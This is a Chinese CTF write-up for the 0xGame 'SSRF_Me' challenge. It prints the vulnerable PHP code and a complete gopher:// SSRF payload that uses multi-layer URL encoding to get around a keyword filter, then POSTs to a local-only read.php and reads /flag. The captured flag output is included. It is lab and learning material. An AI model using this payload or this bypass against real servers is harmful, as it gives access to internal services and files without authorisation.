# SSRF_Me

0xgame.h4ck.fun

## 题目页面

http://106.15.250.209:6655/

```php
<?php 
error_reporting(0);
highlight_file(__FILE__);
$url=$_GET['url'];
if(preg_match('/127.0.0.1|flag|dict|file|ftp/i',$url)){
  die('想都别想');
}//read.php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
$output = curl_exec($ch);
echo $output;
curl_close($ch);
```

## 题解

利用 ssrf 漏洞

### 1.

首先观察 php 文件，发现可传入的变量 `$url` ，使用 get 方式传入

由于 if 语句对 url 进行了关键字过滤，无法直接查询 /flag 目录，也无法使用 dict, file, ftp 协议访问文件目录，考虑使用 **gopher** 协议

注意到 127.0.0.1 被过滤，改为使用 localhost 访问，关于 `preg_match()` 过滤的绕过，[看这里](传参过滤绕过.md)

利用注释提示的 read.php ，首先尝试访问 http://106.15.250.209:6655/read.php ，发现无法从外部访问

使用 url 变量，构造请求尝试访问 http://106.15.250.209:6655/?url=localhost/read.php

### 2.

返回结果

```php+HTML
<?php
if('127.0.0.1'!=$_SERVER['REMOTE_ADDR']){
    die('Allow local only');
}
if('GET' === $_SERVER['REQUEST_METHOD']){
  highlight_file(__FILE__);
  die('Invalid request mode');
}

$filename=$_POST['name'];
if(preg_match('/..\//',$filename)){
    die('nonono');
}
echo file_get_contents(urldecode($filename));Invalid request mode
```

发现使用 url 变量直接访问的形式不对，需要使用 post 形式的请求

使用 gopher 协议构造本地访问请求的 post 报文

```php+HTML
POST /read.php HTTP/1.1
Host: localhost:80
content-type: application/x-www-form-urlencoded
Content-Length: 14

name=flag

```

注意使用多重 url 编码，同时对 flag 进行转码，防止在初次传入 url 时被过滤

| hex  | character |
| :--: | :-------: |
|  20  |   space   |
|  25  |     %     |
|  2F  |     /     |
|  3A  |     :     |

最终得到的地址

http://106.15.250.209:6655/?url=gopher%3A%2F%2Flocalhost%3A80%2F_POST%2520%2Fread.php%2520HTTP%2F1.1%250D%250AHost%253A%2520localhost%253A80%250D%250Acontent-type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252014%250D%250A%250D%250Aname%253D%25252F%252566lag%250D%250A

回显

```php+HTML
<?php 
error_reporting(0);
highlight_file(__FILE__);
$url=$_GET['url'];
if(preg_match('/127.0.0.1|flag|dict|file|ftp/i',$url)){
  die('想都别想');
}//read.php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
$output = curl_exec($ch);
echo $output;
curl_close($ch);
HTTP/1.1 200 OK Server: nginx/1.16.1 Date: Thu, 21 Oct 2021 14:29:39 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive X-Powered-By: PHP/7.4.5 29 0xGame{G0pher_pr0toc01_ls_v3ry_p0werfu1} 0
```

解决

## Extra

ssrf相关资料

https://blog.csdn.net/weixin_52250313/article/details/119496835

https://zhuanlan.zhihu.com/p/112055947